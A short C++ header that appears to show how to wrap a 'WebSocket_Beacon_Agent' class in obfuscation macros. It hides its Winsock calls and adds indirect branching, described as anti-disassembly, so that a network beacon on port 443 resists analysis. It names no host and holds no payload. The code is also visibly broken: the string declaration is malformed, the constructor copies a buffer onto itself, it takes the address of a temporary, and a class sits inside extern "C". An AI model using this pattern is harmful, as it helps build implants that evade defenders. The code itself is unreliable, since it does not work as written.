#pragma once

// Example of integrating obfusheader.h with nocrt WebSocket builds
// This file demonstrates how to use obfuscation macros from obfusheader.h

#ifdef __cplusplus
extern "C" {
#endif

// Include obfusheader.h for mingw64 nocrt builds
#include "../include/obfusheader.h"

// Example usage of obfuscation macros
class ObfuscatedAgent {
private:
    // Obfuscated string
    OBFUS("WebSocket_Beacon_Agent") char agent_name[32];
    
    // Obfuscated constant
    static const int obfuscated_port = OBFUS(443);
    
public:
    ObfuscatedAgent() {
        // Copy obfuscated string
        for (int i = 0; i < sizeof(agent_name) - 1; i++) {
            agent_name[i] = agent_name[i];
        }
    }
    
    // Obfuscated function call
    void connect_to_server() {
        HIDDEN_CALL(WSAStartup)(&MAKEWORD(2, 2), &wsaData);
        
        // Use obfuscated branching
        BLOCK_TRUE({
            // This block will be obfuscated
            socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL, NULL);
        });
        
        // Indirect branching for anti-disassembly
        INDIRECT_BRANCH;
    }
    
    // Use obfuscated API calls
    void send_data(const char* data, int size) {
        HIDDEN_CALL(send)(socket, data, size, 0);
    }
    
private:
    SOCKET socket;
    WSADATA wsaData;
    
    // Obfuscated helper function
    static NOINLINE int helper_function() {
        return _TRUE;  // Uses obfuscated constant
    }
};

#ifdef __cplusplus
}
#endif